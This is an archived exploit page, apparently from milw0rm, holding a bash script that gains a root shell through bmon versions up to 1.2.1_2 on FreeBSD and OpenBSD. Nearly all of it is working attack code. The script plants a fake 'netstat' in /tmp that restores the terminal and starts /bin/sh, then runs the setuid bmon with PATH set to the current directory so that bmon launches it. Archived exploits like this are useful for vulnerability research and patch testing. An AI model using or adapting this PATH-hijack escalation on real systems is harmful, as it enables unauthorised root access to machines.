<html><head><title>BSD bmon <= 1.2.1_2 Local Exploit</title></head><pre>#!/usr/local/bin/bash

# Written by Idan Nahoum. idanna@bk.ru
# local exploit for FreeBSD/OpenBSD with bmon &lt; 1.2.1_2 installed.
# when bmon is executed with the -n parameter it popen()s netcat
# but fail to provide an absoluth path.
# some bsds are configured with acls that doesnt allow setuid files to 
# run except those that are explicity allowed, so creating a file called 
# netcat that chmod's +s bash wouldnt work, bash needs to run directly by
# bmon which uses ncurses, so to get a useable shell we need to redirect
# stdout to stderr (stdout is closed), and restore the stty settings.
# http://www.vuxml.org/freebsd/938f357c-16dd-11d9-bc4a-000c41e2cdad.html

declare -r SPATH=&quot;${PATH}&quot;
declare -r STTY_EXEC=$(which stty)
declare -r STTY_SETTINGS=$(${STTY_EXEC} -g) 
declare -r QSHELL=&quot;/usr/local/bin/bash&quot;
declare BMON_EXEC=&quot;/usr/local/sbin/bmon&quot;

echo &quot;$0 &lt;path to bmon&gt; [default: ${BMON_EXEC}]&quot;

[ &quot;$#&quot; -gt &quot;0&quot; ] &amp;&amp; BMON_EXEC=&quot;${1}&quot;

[ -x &quot;${BMON_EXEC}&quot; ] || 
{
echo &quot;${BMON_EXEC} not found&quot;
exit
}

cd /tmp

# apparently bmon closes stdout, so we run a shell with stdout redirected 
# to stderr.

cat &gt; ./netstat &lt;&lt;EOF
${STTY_EXEC} ${STTY_SETTINGS}
PATH=${SPATH} /bin/sh 1&gt;&amp;2
EOF

/bin/chmod 755 ./netstat
echo &quot;trying to exploit&quot;
PATH=./ &quot;${BMON_EXEC}&quot; -n 

# milw0rm.com [2004-10-16]</pre></html>